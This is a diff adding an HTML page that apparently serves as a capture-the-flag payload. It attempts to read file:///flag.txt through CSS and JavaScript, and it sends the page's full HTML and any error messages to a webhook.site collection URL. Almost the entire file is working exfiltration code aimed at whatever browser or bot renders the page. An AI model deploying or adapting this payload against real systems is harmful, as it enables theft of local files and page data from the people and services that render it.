@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+/* Try to load flag as CSS background image */
+body::before {
+    content: url('file:///flag.txt');
+    background: url('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?css=loaded');
+}
+</style>
+</head>
+<script>
+// Also try JavaScript approach
+setTimeout(() => {
+    // Send page content to see if flag is somehow embedded
+    fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?page_content=' + encodeURIComponent(document.documentElement.outerHTML));
+    
+    // Try to access through window.location
+    try {
+        window.location = 'file:///flag.txt#' + Math.random();
+    } catch(e) {
+        fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?location_error=' + encodeURIComponent(e.message));
+    }
+}, 1000);
+</script>
+<body>
+<p>CSS + JS flag extraction</p>
+</body>
+</html>
